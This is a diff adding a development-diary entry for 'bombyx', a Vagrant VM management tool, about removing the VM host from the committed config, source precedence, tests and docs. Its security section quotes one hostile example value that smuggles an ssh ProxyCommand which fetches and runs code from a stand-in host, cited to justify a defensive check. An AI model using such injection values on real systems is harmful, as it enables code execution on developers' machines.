@@ -2,6 +2,100 @@
 
 Development diary for bombyx. Newest entries first.
 
+### 2026-08-13
+
+**The VM host left `bombyx.toml` entirely**
+
+Two days ago the answer to "a committed config cannot name
+everyone's VM host" was an overlay file: keep `host` in
+`bombyx.toml`, let `bombyx.local.toml` replace it. That was half
+a fix. The committed default still existed, still named one
+person's machine, and still applied to anyone who did not know
+to write the override -- and the thing it aims is `destroy`,
+which runs `vagrant destroy` and `rm -rf` on whatever host wins.
+A default that is wrong for everyone but its author is not a
+default.
+
+So `host` is gone from the project file and a key there is now a
+hard error rather than a warning. Ignoring it was the other
+option and it is worse: the key stays in the repo, the warning
+gets tuned out, and the next reader cannot tell whether the
+value is in force. An error is read once and fixed once.
+
+The value now comes from four sources, first match winning:
+`--host`, `BOMBYX_HOST`, `bombyx.local.toml`, then a
+per-developer `config.toml` under `%APPDATA%\bombyx` or
+`$XDG_CONFIG_HOME`/`$HOME/.config`. The usual case is the last
+one -- write it once, every project uses it.
+
+Three things are worth recording because they are not obvious
+from the diff:
+
+`Config::load` takes a `HostSources` struct rather than reading
+the environment itself, and `config_dir_from` takes a closure
+over environment lookups. Both exist so precedence is unit-
+testable without mutating the process environment, which is
+global and would make the tests race each other. The binary is
+the only thing that touches `std::env`.
+
+`with_overlay` deliberately stops applying `host`. The resolver
+has already ranked the overlay's value against the flag and the
+environment, both of which outrank it; re-applying it during the
+merge would silently promote the file above both. There is a
+test pinning that seam, because a comment does not fail.
+
+The integration tests now set `BOMBYX_CONFIG_HOME` at a fixture
+directory and clear `BOMBYX_HOST`. Without that, every assertion
+would read the developer's own config -- green on this machine,
+red on the next.
+
+**The security rationale had to be rewritten, not copied**
+
+The `host` charset check existed because `bombyx.toml` travels
+inside a repo: `host = "-oProxyCommand=curl evil|sh"` is read by
+`ssh` as an option, so a clone could run code on the workstation
+from a bare `bombyx status`. That specific path is now closed by
+construction -- the field is refused in the file.
+
+The check stays, because the remaining sources can still be
+wrong: a local file, a per-developer file, an env var, a
+mistyped flag. But every place that explained it in terms of a
+hostile repo was now overclaiming, so the prose says it guards
+the argv rather than one particular file. This is the
+"after removing a capability, re-grep for it" rule paying off; a
+plain `grep` for `host` found stale claims in `.gitignore`, the
+architect skill, two doc comments and the CHANGELOG.
+
+**A notice that lied about which host was in force**
+
+Caught by running the thing rather than by a test. With a
+`bombyx.local.toml` present, bombyx printed
+`bombyx.local.toml overrides bombyx.toml` -- true, and read as
+"the host in that file is in force" even when `--host` had
+outranked it. Since teardown deletes a directory on the winner,
+bombyx now also prints `host <name> from --host` /
+`from BOMBYX_HOST` when the value came from outside both files.
+
+**The docs grew a tutorial, and the README shrank**
+
+`docs/usage.md` took the command reference out of the README
+(350 lines down to ~200), and `docs/tutorial.md` is a new
+end-to-end walkthrough: workstation, VM host, sample project
+with a Vagrantfile and a provisioning script, first boot, daily
+loop, troubleshooting. Its bombyx output is real -- captured by
+building a sample project in a scratch directory, including the
+two failure cases -- but the Vagrantfile and `provision.sh` have
+not been booted, and the page says so in its header.
+
+One claim in it was wrong and got corrected on the spot: that a
+laptop is a pointless VM host because "the isolation buys you
+nothing". A VM on your own machine still gives a separate
+kernel, no mounted host filesystem and no credentials in the
+guest. What it gives up is escape-resistance and network
+isolation. Same-machine operation also needs no code: `host` is
+an SSH alias, so it can point at loopback, given a POSIX login
+shell and libvirt on the far side.
+
 ### 2026-08-11
 
 **`vagrant_dir` would tar whatever you pointed it at**
